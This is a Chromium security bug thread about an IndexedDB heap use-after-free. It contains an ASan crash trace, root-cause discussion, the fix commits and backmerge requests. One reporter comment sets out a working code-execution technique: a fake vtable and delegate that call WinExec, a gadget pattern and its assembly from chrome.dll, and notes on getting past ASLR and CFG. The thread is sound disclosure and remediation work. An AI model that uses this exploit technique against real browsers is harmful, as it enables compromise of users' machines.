    #3 0x12b12a30014d in base::internal::Invoker<base::internal::FunctorTraits<void (mojo::internal::SelfOwnedAssociatedReceiver<blink::mojom::IDBDatabase>::*&&)(unsigned int, const std::__Cr::basic_string<char,std::__Cr::char_traits<char>,std::__Cr::allocator<char> > &),mojo::internal::SelfOwnedAssociatedReceiver<blink::mojom::IDBDatabase> *>,base::internal::BindState<1,1,0,void (mojo::internal::SelfOwnedAssociatedReceiver<blink::mojom::IDBDatabase>::*)(unsigned int, const std::__Cr::basic_string<char,std::__Cr::char_traits<char>,std::__Cr::allocator<char> > &),base::internal::UnretainedWrapper<mojo::internal::SelfOwnedAssociatedReceiver<blink::mojom::IDBDatabase>,base::unretained_traits::MayNotDangle,0> >,void (unsigned int, const std::__Cr::basic_string<char,std::__Cr::char_traits<char>,std::__Cr::allocator<char> > &)>::RunOnce c:\src\chromium\src\base\functional\bind_internal.h:972
    #4 0x12b11d743a5e in base::OnceCallback<void (unsigned int, const std::__Cr::basic_string<char,std::__Cr::char_traits<char>,std::__Cr::allocator<char> > &)>::Run c:\src\chromium\src\base\functional\callback.h:155
    #5 0x12b133ad9b07 in mojo::InterfaceEndpointClient::NotifyError c:\src\chromium\src\mojo\public\cpp\bindings\lib\interface_endpoint_client.cc:775
    #6 0x12b133ab947f in mojo::internal::MultiplexRouter::ProcessNotifyErrorTask c:\src\chromium\src\mojo\public\cpp\bindings\lib\multiplex_router.cc:1078
    #7 0x12b133aad2ed in mojo::internal::MultiplexRouter::ProcessTasks c:\src\chromium\src\mojo\public\cpp\bindings\lib\multiplex_router.cc:991
    #8 0x12b133ab49cf in mojo::internal::MultiplexRouter::Accept c:\src\chromium\src\mojo\public\cpp\bindings\lib\multiplex_router.cc:792
    #9 0x12b133acd8eb in mojo::MessageDispatcher::Accept c:\src\chromium\src\mojo\public\cpp\bindings\lib\message_dispatcher.cc:43
    #10 0x12b133afe049 in mojo::Connector::DispatchMessageW c:\src\chromium\src\mojo\public\cpp\bindings\lib\connector.cc:561
    #11 0x12b133affb70 in mojo::Connector::ReadAllAvailableMessages c:\src\chromium\src\mojo\public\cpp\bindings\lib\connector.cc:619
    #12 0x12b133aff480 in mojo::Connector::OnWatcherHandleReady c:\src\chromium\src\mojo\public\cpp\bindings\lib\connector.cc:416
    #13 0x12b133b01973 in base::internal::Invoker<base::internal::FunctorTraits<void (mojo::Connector::*const &)(const char *, unsigned int),mojo::Connector *,const char *const &>,base::internal::BindState<1,1,0,void (mojo::Connector::*)(const char *, unsigned int),base::internal::UnretainedWrapper<mojo::Connector,base::unretained_traits::MayNotDangle,0>,base::internal::UnretainedWrapper<const char,base::unretained_traits::MayNotDangle,0> >,void (unsigned int)>::Run c:\src\chromium\src\base\functional\bind_internal.h:979
    #14 0x12b120fffde6 in base::RepeatingCallback<void (unsigned int)>::Run c:\src\chromium\src\base\functional\callback.h:343
    #15 0x12b120fffb3f in base::internal::Invoker<base::internal::FunctorTraits<void (*const &)(const base::RepeatingCallback<void (unsigned int)> &, unsigned int, const mojo::HandleSignalsState &),const base::RepeatingCallback<void (unsigned int)> &>,base::internal::BindState<0,1,0,void (*)(const base::RepeatingCallback<void (unsigned int)> &, unsigned int, const mojo::HandleSignalsState &),base::RepeatingCallback<void (unsigned int)> >,void (unsigned int, const mojo::HandleSignalsState &)>::Run c:\src\chromium\src\base\functional\bind_internal.h:979
    #16 0x12b12c58a7b4 in base::RepeatingCallback<void (unsigned int, const mojo::HandleSignalsState &)>::Run c:\src\chromium\src\base\functional\callback.h:343
    #17 0x12b13443e59f in mojo::SimpleWatcher::OnHandleReady c:\src\chromium\src\mojo\public\cpp\system\simple_watcher.cc:278
    #18 0x12b13443f618 in base::internal::Invoker<base::internal::FunctorTraits<void (mojo::SimpleWatcher::*&&)(int, unsigned int, const mojo::HandleSignalsState &),base::WeakPtr<mojo::SimpleWatcher> &&,int &&,unsigned int &&,mojo::HandleSignalsState &&>,base::internal::BindState<1,1,0,void (mojo::SimpleWatcher::*)(int, unsigned int, const mojo::HandleSignalsState &),base::WeakPtr<mojo::SimpleWatcher>,int,unsigned int,mojo::HandleSignalsState>,void ()>::RunOnce c:\src\chromium\src\base\functional\bind_internal.h:972
    #19 0x12b11c907e54 in base::OnceCallback<void ()>::Run c:\src\chromium\src\base\functional\callback.h:155
    #20 0x12b133e58e9c in base::TaskAnnotator::RunTaskImpl c:\src\chromium\src\base\task\common\task_annotator.cc:207
    #21 0x12b133d4f2cc in base::internal::TaskTracker::RunBlockShutdown c:\src\chromium\src\base\task\thread_pool\task_tracker.cc:679
    #22 0x12b133d4d16a in base::internal::TaskTracker::RunTask c:\src\chromium\src\base\task\thread_pool\task_tracker.cc:501
    #23 0x12b133d4bd4e in base::internal::TaskTracker::RunAndPopNextTask c:\src\chromium\src\base\task\thread_pool\task_tracker.cc:391
    #24 0x12b133d2a04d in base::internal::WorkerThread::RunWorker c:\src\chromium\src\base\task\thread_pool\worker_thread.cc:473
    #25 0x12b133d28ddf in base::internal::WorkerThread::RunPooledWorker c:\src\chromium\src\base\task\thread_pool\worker_thread.cc:359
    #26 0x12b133bfa6d1 in base::`anonymous namespace'::ThreadFunc c:\src\chromium\src\base\threading\platform_thread_win.cc:114
    #27 0x7ffaa683beee in _asan_wrap_CreateThread+0x14e (c:\src\chromium\src\out\asan64\clang_rt.asan_dynamic-x86_64.dll+0x18005beee)

previously allocated by thread T8 here:
    #0 0x7ffaa683c6ff in operator new+0x8f (c:\src\chromium\src\out\asan64\clang_rt.asan_dynamic-x86_64.dll+0x18005c6ff)
    #1 0x12b12a3408d7 in content::indexed_db::Database::CreateConnection c:\src\chromium\src\content\browser\indexed_db\instance\database.cc:1105
    #2 0x12b12a317556 in content::indexed_db::ConnectionCoordinator::OpenRequest::StartUpgrade c:\src\chromium\src\content\browser\indexed_db\instance\connection_coordinator.cc:337
    #3 0x12b12a3181ea in base::internal::Invoker<base::internal::FunctorTraits<void (content::indexed_db::ConnectionCoordinator::DeleteRequest::*&&)(),base::WeakPtr<content::indexed_db::ConnectionCoordinator::DeleteRequest> &&>,base::internal::BindState<1,1,0,void (content::indexed_db::ConnectionCoordinator::DeleteRequest::*)(),base::WeakPtr<content::indexed_db::ConnectionCoordinator::DeleteRequest> >,void ()>::RunOnce c:\src\chromium\src\base\functional\bind_internal.h:972
    #4 0x12b11c907e54 in base::OnceCallback<void ()>::Run c:\src\chromium\src\base\functional\callback.h:155
    #5 0x12b12a30f3c5 in content::indexed_db::ConnectionCoordinator::ConnectionRequest::ContinueAfterAcquiringLocks c:\src\chromium\src\content\browser\indexed_db\instance\connection_coordinator.cc:125
    #6 0x12b12a30d7b8 in content::indexed_db::ConnectionCoordinator::OpenRequest::OnNoConnections c:\src\chromium\src\content\browser\indexed_db\instance\connection_coordinator.cc:325
    #7 0x12b12a310cb3 in content::indexed_db::ConnectionCoordinator::OpenRequest::ContinueOpening c:\src\chromium\src\content\browser\indexed_db\instance\connection_coordinator.cc:287
    #8 0x12b12a30fbc0 in content::indexed_db::ConnectionCoordinator::OpenRequest::InitDatabase c:\src\chromium\src\content\browser\indexed_db\instance\connection_coordinator.cc:227
    #9 0x12b12a316644 in base::internal::Invoker<base::internal::FunctorTraits<void (content::indexed_db::ConnectionCoordinator::DeleteRequest::*&&)(bool),base::WeakPtr<content::indexed_db::ConnectionCoordinator::DeleteRequest> &&,bool &&>,base::internal::BindState<1,1,0,void (content::indexed_db::ConnectionCoordinator::DeleteRequest::*)(bool),base::WeakPtr<content::indexed_db::ConnectionCoordinator::DeleteRequest>,bool>,void ()>::RunOnce c:\src\chromium\src\base\functional\bind_internal.h:972
    #10 0x12b11c907e54 in base::OnceCallback<void ()>::Run c:\src\chromium\src\base\functional\callback.h:155
    #11 0x12b12a4b9dfd in content::indexed_db::PartitionedLockManager::MaybeGrantLocksAndIterate c:\src\chromium\src\components\services\storage\indexed_db\locks\partitioned_lock_manager.cc:159
    #12 0x12b12a4b86ed in content::indexed_db::PartitionedLockManager::AcquireLocks c:\src\chromium\src\components\services\storage\indexed_db\locks\partitioned_lock_manager.cc:104
    #13 0x12b12a30f637 in content::indexed_db::ConnectionCoordinator::ConnectionRequest::ContinueAfterAcquiringLocks c:\src\chromium\src\content\browser\indexed_db\instance\connection_coordinator.cc:135
    #14 0x12b12a30ce0f in content::indexed_db::ConnectionCoordinator::OpenRequest::Perform c:\src\chromium\src\content\browser\indexed_db\instance\connection_coordinator.cc:200
    #15 0x12b12a309edd in content::indexed_db::ConnectionCoordinator::ExecuteTask c:\src\chromium\src\content\browser\indexed_db\instance\connection_coordinator.cc:671
    #16 0x12b12a3318bd in content::indexed_db::Database::RunTasks c:\src\chromium\src\content\browser\indexed_db\instance\database.cc:325
    #17 0x12b12a2cda99 in content::indexed_db::BucketContext::RunTasks c:\src\chromium\src\content\browser\indexed_db\instance\bucket_context.cc:446
    #18 0x12b12a2e3f9f in base::internal::Invoker<base::internal::FunctorTraits<void (content::indexed_db::BucketContext::*&&)(),base::WeakPtr<content::indexed_db::BucketContext> &&>,base::internal::BindState<1,1,0,void (content::indexed_db::BucketContext::*)(),base::WeakPtr<content::indexed_db::BucketContext> >,void ()>::RunOnce c:\src\chromium\src\base\functional\bind_internal.h:972
    #19 0x12b11c907e54 in base::OnceCallback<void ()>::Run c:\src\chromium\src\base\functional\callback.h:155
    #20 0x12b133e58e9c in base::TaskAnnotator::RunTaskImpl c:\src\chromium\src\base\task\common\task_annotator.cc:207
    #21 0x12b133d4f2cc in base::internal::TaskTracker::RunBlockShutdown c:\src\chromium\src\base\task\thread_pool\task_tracker.cc:679
    #22 0x12b133d4d16a in base::internal::TaskTracker::RunTask c:\src\chromium\src\base\task\thread_pool\task_tracker.cc:501
    #23 0x12b133d4bd4e in base::internal::TaskTracker::RunAndPopNextTask c:\src\chromium\src\base\task\thread_pool\task_tracker.cc:391
    #24 0x12b133d2a04d in base::internal::WorkerThread::RunWorker c:\src\chromium\src\base\task\thread_pool\worker_thread.cc:473
    #25 0x12b133d28ddf in base::internal::WorkerThread::RunPooledWorker c:\src\chromium\src\base\task\thread_pool\worker_thread.cc:359
    #26 0x12b133bfa6d1 in base::`anonymous namespace'::ThreadFunc c:\src\chromium\src\base\threading\platform_thread_win.cc:114
    #27 0x7ffaa683beee in _asan_wrap_CreateThread+0x14e (c:\src\chromium\src\out\asan64\clang_rt.asan_dynamic-x86_64.dll+0x18005beee)

Thread T8 created by T0 here:
    #0 0x7ffaa683be04 in _asan_wrap_CreateThread+0x64 (c:\src\chromium\src\out\asan64\clang_rt.asan_dynamic-x86_64.dll+0x18005be04)
    #1 0x12b133bf94bc in base::`anonymous namespace'::CreateThreadInternal c:\src\chromium\src\base\threading\platform_thread_win.cc:182
    #2 0x12b133bf922f in base::PlatformThreadBase::CreateWithType c:\src\chromium\src\base\threading\platform_thread_win.cc:305
    #3 0x12b133d26fd3 in base::internal::WorkerThread::Start c:\src\chromium\src\base\task\thread_pool\worker_thread.cc:185
    #4 0x12b133d3ee6a in base::internal::ThreadGroup::BaseScopedCommandsExecutor::Flush c:\src\chromium\src\base\task\thread_pool\thread_group.cc:90
    #5 0x12b133d3e962 in base::internal::ThreadGroup::BaseScopedCommandsExecutor::~BaseScopedCommandsExecutor c:\src\chromium\src\base\task\thread_pool\thread_group.cc:81
    #6 0x12b133d2e27e in base::internal::ThreadGroupImpl::ScopedCommandsExecutor::~ScopedCommandsExecutor c:\src\chromium\src\base\task\thread_pool\thread_group_impl.cc:43
    #7 0x12b133d2de04 in base::internal::ThreadGroupImpl::Start c:\src\chromium\src\base\task\thread_pool\thread_group_impl.cc:252
    #8 0x12b133d1ca25 in base::internal::ThreadPoolImpl::Start c:\src\chromium\src\base\task\thread_pool\thread_pool_impl.cc:198
    #9 0x12b129a9d591 in content::StartBrowserThreadPool c:\src\chromium\src\content\browser\startup_helper.cc:98
    #10 0x12b12f5dbc10 in content::ContentMainRunnerImpl::RunBrowser c:\src\chromium\src\content\app\content_main_runner_impl.cc:1226
    #11 0x12b12f5dacb7 in content::ContentMainRunnerImpl::Run c:\src\chromium\src\content\app\content_main_runner_impl.cc:1128
    #12 0x12b12f5ce5af in content::RunContentProcess c:\src\chromium\src\content\app\content_main.cc:346
    #13 0x12b12f5ceaee in content::ContentMain c:\src\chromium\src\content\app\content_main.cc:359
    #14 0x12b11c3b2fd1 in ChromeMain c:\src\chromium\src\chrome\app\chrome_main.cc:228
    #15 0x7ff713c14dbb in MainDllLoader::Launch c:\src\chromium\src\chrome\app\main_dll_loader_win.cc:201
    #16 0x7ff713c12469 in main c:\src\chromium\src\chrome\app\chrome_exe_main_win.cc:352
    #17 0x7ff71422503f in __scrt_common_main_seh D:\a\_work\1\s\src\vctools\crt\vcstartup\src\startup\exe_common.inl:288
    #18 0x7ffb5956e8d6 in BaseThreadInitThunk+0x16 (C:\WINDOWS\System32\KERNEL32.DLL+0x18002e8d6)
    #19 0x7ffb597e8d9b in RtlUserThreadStart+0x2b (C:\WINDOWS\SYSTEM32\ntdll.dll+0x180008d9b)

SUMMARY: AddressSanitizer: heap-use-after-free c:\src\chromium\src\content\browser\indexed_db\instance\database.cc:343 in content::indexed_db::Database::RunTasks
Shadow bytes around the buggy address:
  0x125b1c73d080: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x125b1c73d100: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x125b1c73d180: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x125b1c73d200: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x125b1c73d280: fa fa fa fa fa fa fa fa fa fa fa fa fa fa f7 fa
=>0x125b1c73d300: fd fd fd fd fd fd fd fd[fd]fd fd fd fd fd fd fd
  0x125b1c73d380: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x125b1c73d400: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x125b1c73d480: fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa
  0x125b1c73d500: fa fa fa fa fa fa fa fa fa fa fa fa fa fa f7 fa
  0x125b1c73d580: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb

==63236==ADDITIONAL INFO

==63236==Note: Please include this section with the ASan report.
Task trace:
    #0 0x12b12a2d3d0d in content::indexed_db::BucketContext::QueueRunTasks c:\src\chromium\src\content\browser\indexed_db\instance\bucket_context.cc:437
    #1 0x12b13443f0af in mojo::SimpleWatcher::Context::Notify c:\src\chromium\src\mojo\public\cpp\system\simple_watcher.cc:102


Command line: `"out\asan64\chrome" --user-data-dir="c:\src\profiles\446722008" --incognito --flag-switches-begin --flag-switches-end

```

### wf...@chromium.org (2025-09-23)

Hi evan, I'm curious if <https://chromium-review.googlesource.com/c/chromium/src/+/6707771> changed this behavior? I am trying to work out how far back in milestones this bug might exist?

### ev...@microsoft.com (2025-09-23)

I went through the code history and it looks to me like this bug has existed since [this](https://chromium-review.googlesource.com/c/chromium/src/+/1758713) major change from 2019, aligning with the issue reporter's guess. The problem ever since then has been that the task queue (which actually deletes the connection/database) is pumped asynchronously, giving a new connection the chance to be established. Back then, before some refactors, `IndexedDBDatabase::ForceCloseAndRunTasks` ran `tasks_available_callback_` which was `IndexedDBFactoryImpl::MaybeRunTasksForOrigin` which would run database tasks asynchronously i.e. with `PostTask`.

As far as the fix, it seems this is only exploitable with a compromised renderer, so we should probably be killing the renderer with `mojo::ReportBadMessage()`. Or, this might be able to happen if someone is tinkering with the inspector and gets unlucky (as the modified mojo invocation from the renderer is using an inspector API[1]), in which case we could handle it gracefully [like so](https://chromium-review.googlesource.com/c/chromium/src/+/6972630). I did try to write a unit test for this but failed to get the timing right, I guess.

As luck would have it, @ab...@microsoft.com has been working on a mojoLPM fuzzer for the mojo IDB interfaces. We were wondering why we'd never seen a security vulnerability of this kind reported.

[1] Are DevTools mojo APIs supposed to be separated and disabled somehow for normal renderers, or are they also considered to be connected to an untrusted process?

### wf...@chromium.org (2025-09-24)

Thanks, I think even if this requires a compromised renderer, it's still looking like a browser bug, so this needs to be fixed as per our security bug SLO. Do you know if you can work on it or if we need to find someone else?

### ev...@microsoft.com (2025-09-24)

Yes, I agree it needs fixing. I am trying to understand whether the fact that we have APIs intended just for devtools in indexeddb.mojom, which can then be co-opted by compromised renderers, is itself a bad practice, or if we just need to harden those APIs on the browser side.

If we are leaving the devtools APIs in place then the spot fix for this is pretty easy, which is linked in my last comment. (Although test coverage was proving slightly troublesome.)

I can continue work on this but I am also OOO soon and coming back Oct-6 so depending on the urgency someone else may need to land it --- I can ask some of my IDB co-owners to cover.

### ch...@google.com (2025-09-25)

Setting milestone because of s0/s1 severity.

### dx...@google.com (2025-09-25)

Project: chromium/src  

Branch:  main  

Author:  Evan Stade [evanstade@microsoft.com](mailto:evanstade@microsoft.com)  

Link:    <https://chromium-review.googlesource.com/6972630>

IDB: don't make new Connection to Database after being force closed

---


Expand for full commit details
```
     
    When a Database is force-closed: 
    * Queued open requests are cancelled in ConnectionCoordinator 
    * Database is deleted asynchronously 
     
    New connection requests that make it in between the queued deletion 
    (BucketContext::QueueRunTasks()) and the actual deletion 
    (BucketContext::RunTasks()) should also be cancelled/errored out in the 
    same manner as those which are already waiting in the 
    ConnectionCoordinator task queue. 
     
    Bug: 446722008 
    Change-Id: Id95b337fbfff7f361d2ff61e21bb46f18f577da4 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/6972630 
    Reviewed-by: Steve Becker <stevebe@microsoft.com> 
    Commit-Queue: Evan Stade <evanstade@microsoft.com> 
    Cr-Commit-Position: refs/heads/main@{#1520777}

```

---

Files:

- M `content/browser/indexed_db/instance/bucket_context.cc`
- M `content/browser/indexed_db/instance/database.cc`
- M `content/browser/indexed_db/instance/database.h`

---

Hash: [1beff97455387771199af33e569c7961edd8d979](https://chromiumdash.appspot.com/commit/1beff97455387771199af33e569c7961edd8d979)  

Date: Thu Sep 25 18:39:11 2025


---

### ev...@microsoft.com (2025-09-25)

should be fixed. Test incoming. @wfh please let me know if we should be refactoring to get rid of devtools APIs from browser/renderer mojoms altogether. Will tackle as a follow-up if so.

Steve, looks like this will need merging to 140 and 141. Could you please help with that while I'm out?

### ch...@google.com (2025-09-25)

Dear owner, thanks for fixing this bug. We've reopened it because:

- It is not clear which CLs have ‘fixed’ (=required to consider the bug resolved; e.g. not logging) this bug. Please fill in the “Fixed By Code Changes” field with the appropriate Gerrit url to disambiguate using the following guidelines:
  - If there are multiple CLs required, please list all.
  - If the fix landed in a third party library (v8, Dawn, etc), please list the third party commits - not the rolls.
  - If there are cherrypicks or back merges, please list the original commits which landed on HEAD.
  - If there is no relevant Gerrit link (i.e. the fix does not live in or roll into Chromium), please use the value ‘NA’.
  - If this is a non-browser ChromeOS-specific bug, please move it to component 1335705 in the Google issue tracker.
  - If this field requires human intervention for some reason, please add this bug to the hotlist id 6265590.
    After resolving the above issue(s), this bug can be marked closed again. Thanks for your time!

### dx...@google.com (2025-09-25)

Project: chromium/src  

Branch:  main  

Author:  Evan Stade [evanstade@microsoft.com](mailto:evanstade@microsoft.com)  

Link:    <https://chromium-review.googlesource.com/6986021>

IDB: Add unit test to verify Open() during force close

---


Expand for full commit details
```
     
    Bug: 446722008 
    Change-Id: I4f86a4f6a020b8d7317b20bf8a95bca2c027163a 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/6986021 
    Commit-Queue: Evan Stade <evanstade@microsoft.com> 
    Reviewed-by: Steve Becker <stevebe@microsoft.com> 
    Cr-Commit-Position: refs/heads/main@{#1520862}

```

---

Files:

- M `content/browser/indexed_db/indexed_db_unittest.cc`

---

Hash: [f290157a6918c954f06f2f652b2412ce09eb41aa](https://chromiumdash.appspot.com/commit/f290157a6918c954f06f2f652b2412ce09eb41aa)  

Date: Thu Sep 25 20:54:17 2025


---

### ch...@google.com (2025-09-26)

Security Merge Request Consideration: This is sufficiently serious that it should be merged to stable. But I can't see a Chromium repo commit here,so you will need to investigate what - if anything - needs to be merged to M140. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.
Security Merge Request Consideration: This is sufficiently serious that it should be merged to beta. But I can't see a Chromium repo commit here,so you will need to investigate what - if anything - needs to be merged to M141. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.
Security Merge Request - Manual Review: Merge review required: no relevant commits could be automatically detected (via Git Watcher comments), sending to merge review for manual evaluation. If you have not already manually listed the relevant commits to be merged via a comment above, please do so ASAP.

Security Merge Request - Manual Review: Merge review required: no relevant commits could be automatically detected (via Git Watcher comments), sending to merge review for manual evaluation. If you have not already manually listed the relevant commits to be merged via a comment above, please do so ASAP.

Security Merge Request: Thank you for fixing this security bug! We aim to ship security fixes as quickly as possible, to limit their opportunity for exploitation as an "n-day" (that is, a bug where git fixes are developed into attacks before those fixes reach users).

We have determined this fix is necessary on milestone(s): [140, 141].

Please answer the following questions so that we can safely process this merge request:

1. Which CLs should be backmerged? (Please include Gerrit links.)
2. Has this fix been verified on Canary to not pose any stability regressions?
3. Does this fix pose any potential non-verifiable stability risks?
4. Does this fix pose any known compatibility risks?
5. Does it require manual verification by the test team? If so, please describe required testing.
6. (no answer required) Please check the OS custom field to ensure all impacted OSes are checked!

### so...@gmail.com (2025-09-26)

Small update on the RCE potential:  

It's possible to call `WinExec("calc.exe", 1)` even with CFG enabled by abusing a function from a base::BindOnce's vftable.

Instead of targeting `TimerBase::OnStop` we now target `base::task::DelayedTaskHandle::Delegate::IsValid` as it gives us less issues.  

CodePath:

```
void TimerBase::Stop() {
  DCHECK_CALLED_ON_VALID_SEQUENCE(sequence_checker_);

  AbandonScheduledTask(); // <--------------- [1]

  OnStop();
  // No more member accesses here: |this| could be deleted after Stop() call.
}

void TimerBase::AbandonScheduledTask() {
  DCHECK_CALLED_ON_VALID_SEQUENCE(sequence_checker_);

  if (delayed_task_handle_.IsValid()) { // <--------------- [2]
    delayed_task_handle_.CancelTask();
  }

  // It's safe to destroy or restart Timer on another sequence after the task is
  // abandoned.
  DETACH_FROM_SEQUENCE(sequence_checker_);
}
bool DelayedTaskHandle::IsValid() const {
  return delegate_ && delegate_->IsValid(); // <--------------- [3]
}

class Delegate {
 public:
  ... omitted ...
  virtual bool IsValid() const = 0; // <--------------- [4]
  ... omitted ...
};

```

We replace our PoC helper function in transaction.cc after applying the previously attached exploit.patch:

```
void Transaction::InitializePoCBuffer() {
  // call order: #2, #3, #1 then frees the buffer..
  static uintptr_t delegate_vtable[] = {
      0x133700001111,  // destructor
      // pattern to find the function in official x64 chrome for windows:
      // CC 48 8B 41 20 4C 8B 41 28 8B 51 30 ?? 8B ?? ?? ?? ?? ?? 4C 89 C1 ?? FF ?? CC
      // any base::BindOnce that is passing at least 2x 64bit parameters (no std::move, no smart pointers, only refs/pointers or 64bit numbers)
      // one example:
      // src\content\browser\screenlock_monitor\screenlock_monitor_device_source_win.cc
      // the invoker for the bind in content::RegisterForSessionNotifications
      0x133700002222,  // IsValid <---------- our target (REPLACE THIS WITH CORRRECT ADDRESS) 
      0x133700003333,  // Cancel
  };
  static uintptr_t delegate_[] = {
      (uintptr_t)delegate_vtable,  // 00
      0,                           // 08
      0,                           // 10
      0,                           // 18
      // WinExec("calc.exe", 1);
      0x1337BAD0ADD0,              // 20 (func address) (WinExec)
      (uintptr_t)"calc.exe",       // 28 (first param)
      1,                           // 30 (second param)
  };
  
  memset((void*)this, 0, sizeof(Transaction));
  *(uintptr_t*)(this) = 0x4141414141414141;  // Transaction::vtable
  this->backing_store_transaction_begun_ = true;
  this->state_ = Transaction::STARTED;
  this->is_commit_pending_ = true;
  uint8_t* delayed_task_handle_ = (uint8_t*)&this->timeout_timer_ + 0x78; // <----------- hardcoded offset for my 142.0.7426.0 build
  *(uintptr_t*)(delayed_task_handle_) = (uintptr_t)delegate_;  // base::task::DelayedTaskHandle::delegate_ (unique_ptr)
}

```

The bind function we abuse looks like this in `Chrome 140.0.7339.208 (Official Build) (64-bit)`

```
chrome.dll+693F130 - mov rax,[rcx+20]
chrome.dll+693F134 - mov r8,[rcx+28]
chrome.dll+693F138 - mov edx,[rcx+30]
chrome.dll+693F13B - mov r9,[chrome.dll+EE85B88] // <------- CFG
chrome.dll+693F142 - mov rcx,r8
chrome.dll+693F145 - jmp r9

```

we replace `0x133700002222` with the base::BindOnce::Invoker function at `base_of("chrome.dll")+0x693F130` (find it in your build)  

we replace `0x1337BAD0ADD0` with `(uintptr_t)GetProcAddressA(GetModuleHandleA("kernel32.dll"), "WinExec")`  

ASLR on windows reuses addresses if the same dll is loaded in multiple processes. Meaning, our renderer will calculate these two addresses in its own process before exploiting this vulnerability. ASLR is not an issue.  

The bind function we abuse is called indirectly as a virtual function, so it's allowed by CFG. WinExec is an imported function so it's allowed by CFG. CFG is not an issue.  

If all succeeds you should see calc.exe pop up and the debugger breaking due to the call to 0x133700003333 (base::task::DelayedTaskHandle::Delegate::Cancel)

I'm still trying to figure out how v8 works to see if I can make a better PoC without exploit.patch...  

feel free to @ me with your PoC if this report goes public before I figure it out :)

### st...@microsoft.com (2025-09-27)

I created the cherry picks for 140 and 141:

6991769: [Merge M141] IDB: don't make new Connection after being force closed | <https://chromium-review.googlesource.com/c/chromium/src/+/6991769>

6990701: [Merge M140] IDB: don't make new Connection after being force closed | <https://chromium-review.googlesource.com/c/chromium/src/+/6990701>

[#comment13](https://issues.chromium.org/issues/446722008#comment13): Answering the questions above:

> Which CLs should be backmerged? (Please include Gerrit links.)

<https://chromium-review.googlesource.com/c/chromium/src/+/6972630>

<https://chromium-review.googlesource.com/c/chromium/src/+/6986021>

> Has this fix been verified on Canary to not pose any stability regressions?

The change is in Canary 142.0.7436.0, which released on 9/26/2026

> Does this fix pose any potential non-verifiable stability risks?

It's hard to manually verify the fix on Canary because the repro steps involve patching process code. However, no new related stability issues seem to have been introduced in 142.0.7436.0, and there is a very low risk of stability issues from the CL itself, which has test coverage.

> Does this fix pose any known compatibility risks?

No compat risks.

> Does it require manual verification by the test team? If so, please describe required testing.

No manual verification required.

> (no answer required) Please check the OS custom field to ensure all impacted OSes are checked!

Done.

### ab...@microsoft.com (2025-09-30)

FWIW, the [WIP IndexedDB mojom fuzzer](https://chromium-review.googlesource.com/c/chromium/src/+/6953724) independently discovered this heap-use-after-free when I left it running on my local machine. The generated fuzzer input is attached to this comment. I can confirm that with the fix from <https://chromium-review.googlesource.com/c/chromium/src/+/6972630>, this input no longer leads to the use after free.

### ts...@google.com (2025-09-30)

Fix looks straightforward, is in M142, but needs to be merged to M141 (7390) by Fri 3-Oct.

### ch...@google.com (2025-09-30)

Merge review required: no relevant commits could be automatically detected (via Git Watcher comments), sending to merge review for manual evaluation. If you have not already manually listed the relevant commits to be merged via a comment above, please do so ASAP.

Please answer the following questions so that we can safely process your merge request:

1. Why does your merge fit within the merge criteria for these milestones?

- Chrome Browser: <https://chromiumdash.appspot.com/branches>
- Chrome OS: <https://goto.google.com/cros-release-branch-merge-guidelines>

2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? <https://goto.google.com/cros-engprodcomponents>
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: alonbajayo (ChromeOS), srinivassista (Desktop US), danielyip (Desktop EMEA), harrysouders (Mobile US), eakpobaro (Mobile EMEA)

### ch...@google.com (2025-09-30)

Merge review required: no relevant commits could be automatically detected (via Git Watcher comments), sending to merge review for manual evaluation. If you have not already manually listed the relevant commits to be merged via a comment above, please do so ASAP.

Please answer the following questions so that we can safely process your merge request:

1. Why does your merge fit within the merge criteria for these milestones?

- Chrome Browser: <https://chromiumdash.appspot.com/branches>
- Chrome OS: <https://goto.google.com/cros-release-branch-merge-guidelines>

2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? <https://goto.google.com/cros-engprodcomponents>
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: lmenezes (ChromeOS), srinivassista (Desktop US), danielyip (Desktop EMEA), govind (Mobile US), eakpobaro (Mobile EMEA)

### st...@microsoft.com (2025-09-30)

> Why does your merge fit within the merge criteria for these milestones?

Security issue.

> What changes specifically would you like to merge? Please link to Gerrit.

<https://chromium-review.googlesource.com/c/chromium/src/+/6986021>
<https://chromium-review.googlesource.com/c/chromium/src/+/6972630>

> Have the changes been released and tested on canary?

The change is in Canary 142.0.7436.0, which released on 9/26/2026

> Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?

Not a new feature.

> If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

No manual verification needed.

### st...@microsoft.com (2025-09-30)

Here's the review for the 141 merge:

